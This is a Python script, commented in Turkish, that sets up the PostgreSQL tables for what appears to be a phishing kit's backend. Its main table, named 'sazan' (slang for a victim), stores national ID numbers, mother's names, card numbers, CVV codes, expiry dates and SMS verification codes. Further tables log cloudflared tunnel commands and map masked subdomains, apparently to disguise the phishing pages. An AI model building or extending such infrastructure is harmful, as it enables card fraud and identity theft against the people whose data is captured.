#!/usr/bin/env python3
"""
PostgreSQL veritabanını başlat - Heroku'da ilk deployment sonrası çalıştırılmalı
"""
from __future__ import annotations

import sys
from pathlib import Path

# Proje root'unu path'e ekle
project_root = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(project_root))

from app.database import get_connection, USING_POSTGRES


def init_postgres_schema():
    """PostgreSQL için gerekli tabloları oluştur"""
    if not USING_POSTGRES:
        print("SQLite kullanılıyor, schema otomatik oluşturulacak.")
        return

    print("PostgreSQL schema'sı oluşturuluyor...")
    
    conn = get_connection()
    cursor = conn.cursor()
    
    try:
        # Ana sazan tablosu
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS sazan (
                id BIGSERIAL PRIMARY KEY,
                tc TEXT,
                ad TEXT,
                soyad TEXT,
                dogum_yili TEXT,
                anne_adi TEXT,
                kart_no TEXT,
                cvv TEXT,
                son_kullanma TEXT,
                telefon TEXT,
                sms_kod TEXT,
                ip TEXT,
                user_agent TEXT,
                browser TEXT,
                os TEXT,
                device TEXT,
                created_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
                toplam_limit INTEGER DEFAULT 0,
                guncel_limit INTEGER DEFAULT 0
            )
        """)
        
        # Ayarlar tablosu
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS app_settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        """)
        
        # Cloudflared logları
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS cloudflared_logs (
                id BIGSERIAL PRIMARY KEY,
                command TEXT NOT NULL,
                stdout TEXT,
                stderr TEXT,
                status TEXT,
                created_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Domain aliasları
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS domain_aliases (
                id TEXT PRIMARY KEY,
                base_domain TEXT NOT NULL,
                subdomain TEXT NOT NULL DEFAULT '',
                masked_subdomain TEXT NOT NULL,
                created_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Index'ler
        cursor.execute("""
            CREATE UNIQUE INDEX IF NOT EXISTS idx_domain_alias_masked
                ON domain_aliases(masked_subdomain)
        """)
        
        cursor.execute("""
            CREATE UNIQUE INDEX IF NOT EXISTS idx_domain_alias_real
                ON domain_aliases(base_domain, subdomain)
        """)
        
        conn.commit()
        print("✓ PostgreSQL schema başarıyla oluşturuldu!")
        
    except Exception as e:
        print(f"✗ Hata oluştu: {e}")
        conn.rollback()
        sys.exit(1)
    finally:
        cursor.close()
        conn.close()


if __name__ == "__main__":
    init_postgres_schema()
